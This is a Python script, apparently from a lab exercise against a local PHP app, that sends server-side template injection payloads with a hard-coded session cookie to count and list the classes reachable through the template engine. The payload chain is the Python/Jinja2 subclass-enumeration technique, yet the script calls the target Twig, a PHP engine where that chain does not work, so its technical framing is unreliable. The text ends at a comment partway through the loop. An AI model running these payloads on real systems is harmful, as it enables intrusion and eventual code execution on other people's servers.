import requests
import re

# Target URL and session cookie
target_url = "http://127.0.0.1:8080/index.php"
session_cookie = "adf118a2717e83ee6455ea878ebb507e"

session = requests.Session()
session.cookies.set('PHPSESSID', session_cookie)

print("Twig SSTI Sub-class Enumeration")
print("="*80)

# First, get the total number of subclasses
try:
    response = session.post(target_url, data={'name': "{{''.__class__.__mro__[2].__subclasses__()|length}}"})
    length_match = re.search(r'<strong>(\d+)</strong>', response.text)
    if length_match:
        total_classes = int(length_match.group(1))
        print(f"Total available subclasses: {total_classes}")
    else:
        print("Could not determine number of subclasses")
        total_classes = 0
except Exception as e:
    print(f"Error getting subclass count: {e}")
    total_classes = 0

if total_classes > 0:
    print(f"\nEnumerating first 30 classes (out of {total_classes}):")
    
    # Test first 30 indices for interesting classes
    for i in range(min(30, total_classes)):
        payload = f"{{{{''.__class__.__mro__[2].__subclasses__()[{i}]|raw}}}}"
        try:
            response = session.post(target_url, data={'name': payload})
            result_match = re.search(r'<strong>(?:</strong>)?(.*?)(?:<strong>)?(?: is in stock!)?</strong>', response.text, re.DOTALL)
            if result_match:
                result = result_match.group(1).strip()
                # Filter out empty/none results
                if result and result != "" and "No" not in result:
                    print(f"[{i:3d}] {result}")
                    
                    # Look for file, database, or system classes
